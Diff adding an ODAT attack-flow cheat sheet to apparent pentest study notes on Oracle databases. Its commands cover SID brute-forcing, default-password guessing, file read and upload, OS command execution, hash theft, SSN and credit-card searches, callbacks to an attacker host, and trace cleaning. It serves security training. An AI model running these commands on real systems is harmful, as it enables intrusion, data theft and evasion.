@@ -283,6 +283,93 @@ python3 odat.py passwordstealer -s <target_ip> -p 1521 -d <SID> -U <user> -P <pa
 python3 odat.py search -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass> --keywords "password,credit_card,ssn"
 ```
 
+### ODAT Quick Navigation Guide
+
+#### Step-by-Step Attack Flow
+
+The typical workflow when using ODAT follows this order:
+
+```
+1. Discover TNS Listener  -->  2. Find SIDs  -->  3. Get Credentials  -->  4. Exploit
+```
+
+#### Phase 1: Discovery - Is Oracle Running?
+
+```bash
+# Use Nmap first to confirm port 1521 is open
+sudo nmap -p1521 -sV <target_ip> --open
+
+# Or use ODAT tnscmd to interact with the listener directly
+python3 odat.py tnscmd -s <target_ip> -p 1521 --ping
+python3 odat.py tnscmd -s <target_ip> -p 1521 --version
+python3 odat.py tnscmd -s <target_ip> -p 1521 --status
+```
+
+#### Phase 2: Enumerate SIDs
+
+You need a valid SID before you can authenticate. Guess or brute-force it:
+
+```bash
+# ODAT SID guesser (uses built-in wordlist)
+python3 odat.py sidguesser -s <target_ip> -p 1521
+
+# Nmap SID brute
+sudo nmap -p1521 --script oracle-sid-brute <target_ip>
+```
+
+Common SIDs to try manually: `XE`, `ORCL`, `ORCLCDB`, `ORCLPDB1`, `PLSExtProc`
+
+#### Phase 3: Get Credentials
+
+Once you have a SID, try to find valid credentials:
+
+```bash
+# ODAT password guesser (tries common Oracle default accounts)
+python3 odat.py passwordguesser -s <target_ip> -p 1521 -d <SID>
+
+# Use a custom username/password list
+python3 odat.py passwordguesser -s <target_ip> -p 1521 -d <SID> --accounts-file accounts.txt
+```
+
+Default accounts to remember: `scott/tiger`, `system/manager`, `sys/change_on_install`, `dbsnmp/dbsnmp`
+
+#### Phase 4: Exploit (With Valid Credentials)
+
+Once you have creds + SID, the real fun begins. Choose your module:
+
+```bash
+# Run ALL exploit modules at once (noisy but thorough)
+python3 odat.py all -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass>
+```
+
+Or pick specific modules:
+
+| Goal | Module | Command |
+|------|--------|---------|
+| **Read a file** | `utlfile` | `python3 odat.py utlfile -s <ip> -d <SID> -U <user> -P <pass> --getFile /etc passwd /tmp/passwd` |
+| **Upload a file** | `utlfile` | `python3 odat.py utlfile -s <ip> -d <SID> -U <user> -P <pass> --putFile /tmp shell.txt ./shell.txt` |
+| **Delete a file** | `utlfile` | `python3 odat.py utlfile -s <ip> -d <SID> -U <user> -P <pass> --removeFile /tmp shell.txt` |
+| **Execute OS command** | `java` | `python3 odat.py java -s <ip> -d <SID> -U <user> -P <pass> --exec whoami` |
+| **Steal password hashes** | `passwordstealer` | `python3 odat.py passwordstealer -s <ip> -d <SID> -U <user> -P <pass>` |
+| **Search DB for keywords** | `search` | `python3 odat.py search -s <ip> -d <SID> -U <user> -P <pass> --keywords "password,ssn"` |
+| **Privilege escalation** | `privesc` | `python3 odat.py privesc -s <ip> -d <SID> -U <user> -P <pass>` |
+| **HTTP requests from DB** | `utlhttp` | `python3 odat.py utlhttp -s <ip> -d <SID> -U <user> -P <pass> --url http://attacker/test` |
+| **SMB capture** | `smb` | `python3 odat.py smb -s <ip> -d <SID> -U <user> -P <pass> --capture <attacker_ip>` |
+| **Clean traces** | `clean` | `python3 odat.py clean -s <ip> -d <SID> -U <user> -P <pass>` |
+
+#### Common Flags Reference
+
+| Flag | Description |
+|------|-------------|
+| `-s` | Target IP address |
+| `-p` | Target port (default 1521) |
+| `-d` | SID (database name) |
+| `-U` | Username |
+| `-P` | Password |
+| `--sysdba` | Connect with SYSDBA privileges |
+| `--no-color` | Disable colored output |
+| `-v` | Verbose output |
+
 ---
 
 ## Footprinting the Service
